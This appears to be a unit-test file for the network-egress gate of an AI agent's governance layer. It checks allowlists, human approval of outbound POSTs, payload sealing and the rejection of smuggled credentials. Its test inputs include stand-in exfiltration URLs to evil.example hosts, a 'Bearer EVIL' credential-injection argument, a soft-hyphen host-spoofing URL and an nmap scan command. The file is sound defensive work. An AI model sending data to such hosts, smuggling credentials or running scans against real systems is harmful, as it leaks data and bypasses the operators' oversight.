"""ADR 0003 egress in the governance seam: the capability-DERIVATION gate.

An egress tool's authority is net.get:<canonical-host>, computed from the request and checked
by the same exact-match core gate — so egress is default-deny, the allowlist is exact (no
subdomain widening), an ineligible URL fails closed, and the destination canonicalizes the
SAME way for the capability key as for the connect host. Also pins: the egress_log run path
carries the channel-integrity record, the approval re-gate re-derives + re-checks the
allowlist (emission TOCTOU), and the offense recognizer TAGS without denying.
"""

import tempfile
import unittest
from unittest import mock

from collaborator.egress import EgressRecord, EgressResult
from collaborator.governance import DENIED, FAILED, HELD, RAN, govern_action
from collaborator.loop import approve
from collaborator.policycaps import mint, workspace_subject
from collaborator.session import Session
from collaborator.toolcall import ToolIntent


def _wf(url):
    return ToolIntent("web_fetch", {"url": url}, "structured")


def _ok_record(dest="docs.example"):
    return EgressRecord(canonical_dest=dest, method="GET", request_target_hash="th",
                        request_bytes=3, status=200, response_hash="rh", response_len=2,
                        redirect_location=None, resolved_ip="93.184.216.34", ok=True)


def _fake_ok_fetch(url, **kw):
    return EgressResult(_ok_record(), body=b"ok")


def _granted(tmp, caps, leash_caps=None, key=b"caps-key"):
    signed = mint(caps, leash_caps or {}, "admin", workspace_subject(tmp), key)
    return Session(workspace=tmp, policy_caps=signed, caps_key=key)


class DefaultDeny(unittest.TestCase):
    def test_no_net_cap_denies(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d)  # default caps: fs read/write only, no net.get
            dec = govern_action(s, _wf("https://docs.example/x"))
            self.assertEqual(dec.status, DENIED)
            self.assertIn("net.get:docs.example", dec.reason)

    def test_structural_prohibition_nonconsented_host_unreachable(self):
        # The exact-match allowlist means a host you were not granted is UNREACHABLE, not
        # merely un-recognized — the structural prohibition (ADR 0003).
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:example.com",))
            dec = govern_action(s, _wf("https://evil.example.com/steal"))  # subdomain != grant
            self.assertEqual(dec.status, DENIED)
            self.assertIn("net.get:evil.example.com", dec.reason)


class IneligibleUrl(unittest.TestCase):
    def test_http_denied_before_grant_check(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:docs.example",))
            dec = govern_action(s, _wf("http://docs.example/x"))  # not https
            self.assertEqual(dec.status, DENIED)
            self.assertIn("ineligible egress URL", dec.reason)

    def test_userinfo_denied(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:docs.example",))
            dec = govern_action(s, _wf("https://docs.example@evil.com/"))
            self.assertEqual(dec.status, DENIED)
            self.assertIn("ineligible egress URL", dec.reason)


class GrantedRuns(unittest.TestCase):
    def test_canonicalized_grant_runs_and_carries_record(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:docs.example",))
            with mock.patch("collaborator.egress.fetch", _fake_ok_fetch):
                dec = govern_action(s, _wf("https://Docs.Example/PAGE"))  # case-variant host
            self.assertEqual(dec.status, RAN)
            self.assertTrue(dec.cleared)
            self.assertIsNotNone(dec.egress)
            self.assertEqual(dec.egress.canonical_dest, "docs.example")

    def test_failed_fetch_reports_not_verified(self):
        bad = EgressResult(EgressRecord(
            canonical_dest="docs.example", method="GET", request_target_hash="", request_bytes=1,
            status=None, response_hash=None, response_len=0, redirect_location=None,
            resolved_ip=None, ok=False, error="no safe public IP"), body=b"")
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:docs.example",))
            with mock.patch("collaborator.egress.fetch", lambda url, **k: bad):
                dec = govern_action(s, _wf("https://docs.example/x"))
            self.assertEqual(dec.status, FAILED)
            self.assertFalse(dec.cleared)
            self.assertIn("no safe public IP", dec.reason)


class ApprovalRegateTOCTOU(unittest.TestCase):
    def test_host_removed_from_allowlist_between_hold_and_approve_denies(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.get:docs.example",), {"web_fetch": "propose_first"})
            held = govern_action(s, _wf("https://docs.example/x"))
            self.assertEqual(held.status, HELD)
            # Re-mint the signed caps WITHOUT the host (operator revokes the channel).
            s.policy_caps = mint((), {"web_fetch": "propose_first"}, "admin",
                                 workspace_subject(d), b"caps-key")
            with mock.patch("collaborator.egress.fetch", _fake_ok_fetch):  # must NOT be reached
                out = approve(s, held)
            self.assertEqual(out.status, DENIED)
            self.assertIn("not granted at approval time", out.reason)


class OffenseRecognizerIsAuditOnly(unittest.TestCase):
    def test_offense_shape_tags_but_does_not_deny(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("shell.exec",))
            dec = govern_action(s, ToolIntent("run_command", {"command": "nmap -sV example.com"},
                                              "structured"))
            self.assertEqual(dec.status, HELD)          # run_command's propose_first floor — not denied
            self.assertEqual(dec.offense_flag, "nmap")  # tagged for the audit trail
            self.assertIn("offense-shape audit", dec.summary())


# --- ADR 0003 Tier 2: net.post EMISSION gate -----------------------------------------------

NP_URL = "https://api.example/v1/x"
_CAPTURED = {}


def _np(url=NP_URL, body='{"m":"x"}', source="structured"):
    return ToolIntent("net_post", {"url": url, "body": body}, source)


def _fake_post(url, body, *, content_type="application/json", auth=None, keep_preview=False, **kw):
    _CAPTURED.clear()
    _CAPTURED.update(url=url, body=body, content_type=content_type, auth=auth, keep_preview=keep_preview)
    return EgressResult(EgressRecord(
        canonical_dest="api.example", method="POST", request_target_hash="th", request_bytes=3,
        status=200, response_hash="rh", response_len=2, redirect_location=None,
        resolved_ip="93.184.216.34", ok=True, request_body_hash="bh", request_body_len=len(body),
        request_body_preview=(body[:50] if keep_preview else "")), body=b"ok")


class NetPostDefaultDeny(unittest.TestCase):
    def test_no_cap_denies(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("shell.exec",))
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, DENIED)
            self.assertIn("net.post:api.example", dec.reason)

    def test_net_get_does_not_authorize_net_post(self):
        # Reading a host is NOT emitting to it — separate signed namespaces (ADR 0003).
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.get:api.example",))
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, DENIED)
            self.assertIn("net.post:api.example", dec.reason)

    def test_ineligible_url_denied(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.post:api.example",))
            dec = govern_action(s, _np("http://api.example/x"))
            self.assertEqual(dec.status, DENIED)
            self.assertIn("ineligible egress URL", dec.reason)


class NetPostHumanGatedByDefault(unittest.TestCase):
    def test_user_directed_defaults_to_held(self):
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.post:api.example",))
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, HELD)
            self.assertEqual(dec.leash, "propose_first")

    def test_host_leash_override_cannot_drop_the_floor(self):
        # Even a host leash_override to act_then_report is FLOORED back to propose_first for a
        # non-auto host — no config can drop the human hand on an emission.
        with tempfile.TemporaryDirectory() as d:
            s = Session(workspace=d, capabilities=("net.post:api.example",),
                        leash_overrides={"net_post": "act_then_report"})
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, HELD)
            self.assertEqual(dec.leash, "propose_first")


class NetPostAutoLift(unittest.TestCase):
    def _auto(self, d, leash_cap="act_then_report", auto_host="api.example"):
        return _granted(d, ("net.post:api.example", f"net.post.auto:{auto_host}"),
                        {"net_post": leash_cap})

    def test_signed_auto_grant_lifts_user_directed_to_autonomous(self):
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d)
            with mock.patch("collaborator.egress.post", _fake_post):
                dec = govern_action(s, _np())
            self.assertEqual(dec.status, RAN)
            self.assertEqual(dec.leash, "act_then_report")

    def test_proposer_originated_stays_held_even_with_auto(self):
        # The auto grant loosens OPERATOR-directed emission; the model can never self-originate
        # an autonomous POST — the proposer floor wins.
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d)
            dec = govern_action(s, _np(source="proposed"))
            self.assertEqual(dec.status, HELD)
            self.assertEqual(dec.leash, "propose_first")

    def test_leash_cap_can_still_tighten_an_auto_host(self):
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d, leash_cap="propose_first")   # operator tightens the signed cap
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, HELD)
            self.assertEqual(dec.leash, "propose_first")

    def test_auto_for_a_different_host_does_not_lift(self):
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d, auto_host="other.example")   # auto is per-host, exact-match
            dec = govern_action(s, _np())
            self.assertEqual(dec.status, HELD)
            self.assertEqual(dec.leash, "propose_first")


class NetPostCredentialInjection(unittest.TestCase):
    def _auto(self, d):
        return _granted(d, ("net.post:api.example", "net.post.auto:api.example"),
                        {"net_post": "act_then_report"})

    def test_host_credential_injected_for_consented_host(self):
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d)
            s.egress_credentials = {"api.example": "Bearer sk-secret"}
            with mock.patch("collaborator.egress.post", _fake_post):
                dec = govern_action(s, _np())
            self.assertEqual(dec.status, RAN)
            self.assertEqual(_CAPTURED.get("auth"), "Bearer sk-secret")

    def test_no_credential_configured_means_none_sent(self):
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d)  # no egress_credentials
            with mock.patch("collaborator.egress.post", _fake_post):
                dec = govern_action(s, _np())
            self.assertEqual(dec.status, RAN)
            self.assertIsNone(_CAPTURED.get("auth"))

    def test_model_args_cannot_smuggle_a_credential(self):
        # An 'auth'/'authorization' field in the model's args is ignored — the executor never
        # reads one; only the host-config map can inject a credential.
        with tempfile.TemporaryDirectory() as d:
            s = self._auto(d)  # no egress_credentials
            it = ToolIntent("net_post", {"url": NP_URL, "body": "{}", "auth": "Bearer EVIL",
                                         "authorization": "Bearer EVIL2"}, "structured")
            with mock.patch("collaborator.egress.post", _fake_post):
                dec = govern_action(s, it)
            self.assertEqual(dec.status, RAN)
            self.assertIsNone(_CAPTURED.get("auth"))


class NetPostAuditSplit(unittest.TestCase):
    def test_autonomous_emission_is_body_free(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example", "net.post.auto:api.example"),
                         {"net_post": "act_then_report"})
            with mock.patch("collaborator.egress.post", _fake_post):
                dec = govern_action(s, _np(body="secret"))
            self.assertEqual(dec.status, RAN)
            self.assertFalse(_CAPTURED.get("keep_preview"))
            self.assertEqual(dec.egress.request_body_preview, "")

    def test_human_gated_emission_keeps_bounded_preview_and_sends_approved_body(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example",), {"net_post": "propose_first"})
            held = govern_action(s, _np(body="secret"))
            self.assertEqual(held.status, HELD)
            with mock.patch("collaborator.egress.post", _fake_post):
                out = approve(s, held)
            self.assertEqual(out.status, RAN)
            self.assertTrue(_CAPTURED.get("keep_preview"))
            self.assertEqual(_CAPTURED.get("body"), "secret")   # body approved == body sent
            self.assertEqual(out.egress.request_body_preview, "secret")


class NetPostHeldPayloadSeal(unittest.TestCase):
    """Tier 2 has no verifier, so a HELD emission is sealed at hold and approval refuses a payload
    mutated after the human saw it (panel: approved != sent)."""

    def test_mutating_held_url_and_body_after_hold_denies_at_approval(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example", "net.post:evil.example"),
                         {"net_post": "propose_first"})
            held = govern_action(s, _np("https://api.example/pay", body='{"amt":10}'))
            self.assertEqual(held.status, HELD)
            self.assertTrue(held.seal)
            # Mutate the (by-reference) held args to a DIFFERENT (also-granted) host + body.
            held.args["url"] = "https://evil.example/steal"
            held.args["body"] = '{"amt":9999999}'
            with mock.patch("collaborator.egress.post", _fake_post):  # must NOT be reached
                out = approve(s, held)
            self.assertEqual(out.status, DENIED)
            self.assertIn("seal mismatch", out.reason)

    def test_unmutated_held_emission_approves_and_sends(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example",), {"net_post": "propose_first"})
            held = govern_action(s, _np("https://api.example/pay", body='{"amt":10}'))
            self.assertEqual(held.status, HELD)
            with mock.patch("collaborator.egress.post", _fake_post):
                out = approve(s, held)
            self.assertEqual(out.status, RAN)   # unchanged payload -> seal matches -> sends


class NetPostNeverRaises(unittest.TestCase):
    """govern_action / approve must degrade a bad emission to a FAILED Decision, never raise
    (transport red-team S1: a lone-surrogate body is legal JSON but not utf-8-encodable)."""

    def test_lone_surrogate_body_autonomous_fails_not_raises(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example", "net.post.auto:api.example"),
                         {"net_post": "act_then_report"})
            dec = govern_action(s, _np(body="\ud800"))   # must NOT raise
            self.assertin_failed(dec)

    def test_lone_surrogate_body_gated_approve_fails_not_raises(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example",), {"net_post": "propose_first"})
            held = govern_action(s, _np(body="\ud800"))
            self.assertEqual(held.status, HELD)
            out = approve(s, held)                        # must NOT raise
            self.assertin_failed(out)

    def test_egress_backstop_downgrades_any_raise_to_failed(self):
        # Even if the mediated client raised for an UNFORESEEN reason, the seam returns FAILED.
        def boom(*a, **k):
            raise RuntimeError("unexpected")
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example", "net.post.auto:api.example"),
                         {"net_post": "act_then_report"})
            with mock.patch("collaborator.egress.post", boom):
                dec = govern_action(s, _np())
            self.assertEqual(dec.status, FAILED)
            self.assertIn("egress error", dec.reason)

    def assertin_failed(self, dec):
        self.assertEqual(dec.status, FAILED)


class NetPostPreviewShowsCanonicalDest(unittest.TestCase):
    def test_held_emission_preview_carries_canonical_dest(self):
        # M6: the one human hand reads the canonical destination, not a raw string canonicalization
        # may rewrite (soft hyphen / ideographic dot).
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example",), {"net_post": "propose_first"})
            held = govern_action(s, _np("https://api.exa­mple/pay"))  # soft hyphen -> api.example
            self.assertEqual(held.status, HELD)
            self.assertEqual(held.preview.get("canonical_dest"), "api.example")


class NetPostApprovalRegateTOCTOU(unittest.TestCase):
    def test_host_revoked_between_hold_and_approve_denies(self):
        with tempfile.TemporaryDirectory() as d:
            s = _granted(d, ("net.post:api.example",), {"net_post": "propose_first"})
            held = govern_action(s, _np())
            self.assertEqual(held.status, HELD)
            # Operator re-mints the signed caps WITHOUT the emit host between hold and approve.
            s.policy_caps = mint((), {"net_post": "propose_first"}, "admin",
                                 workspace_subject(d), b"caps-key")
            with mock.patch("collaborator.egress.post", _fake_post):  # must NOT be reached
                out = approve(s, held)
            self.assertEqual(out.status, DENIED)
            self.assertIn("not granted at approval time", out.reason)


if __name__ == "__main__":
    unittest.main()
